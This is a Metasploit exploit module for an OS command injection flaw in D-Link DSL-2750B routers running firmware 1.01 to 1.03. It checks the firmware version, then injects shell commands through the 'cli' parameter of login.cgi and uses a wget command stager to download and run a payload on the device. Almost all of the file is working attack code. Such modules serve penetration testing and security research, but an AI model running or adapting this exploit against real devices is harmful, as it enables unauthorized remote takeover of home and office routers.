##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'D-Link DSL-2750B OS Command Injection',
      'Description'    => %q{
        This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices.
        Vulnerability can be exploited through "cli" parameter that is directly used to invoke
	"ayecli" binary. Vulnerable firmwares are from 1.01 up to 1.03.
      },
      'Author'         =>
        [
          'p@ql',  # vulnerability discovery
          'Marcin Bury <marcin[at]threat9.com>'  # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['PACKETSTORM', 135706],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/53'],
        ],
      'Targets'        =>
        [
          [ 'Linux mipsbe Payload',
            {
            'Arch' => ARCH_MIPSBE,
            'Platform' => 'linux'
            }
          ],
          [ 'Linux mipsel Payload',
            {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DisclosureDate'  => 'Feb 5 2016',
      'DefaultTarget'   => 0))
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => '/ayefeaturesconvert.js'
      })

      if res && [200].include?(res.code) && res.body =~ /DSL-2750/ && res.body =~ /var AYECOM_FWVER="(\d.\d+)";/
        version = $1
        if version >= "1.01" and version <= "1.03"
          return Exploit::CheckCode::Appears
        else
          return Exploit::CheckCode::Safe
        end
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    begin
      path = "/login.cgi?cli=multilingual show';#{cmd}'$".gsub(/ /, "%20").gsub(/&/, "%26")
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => path,
      }, 5)

      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} Failed to connect to the web server")
    end
  end

  def exploit
    print_status("#{peer} Checking target version...")

    unless check == Exploit::CheckCode::Appears
      return
    end

    execute_cmdstager(
       :flavor => :wget,
       :linemax => 200
    )
  end
end
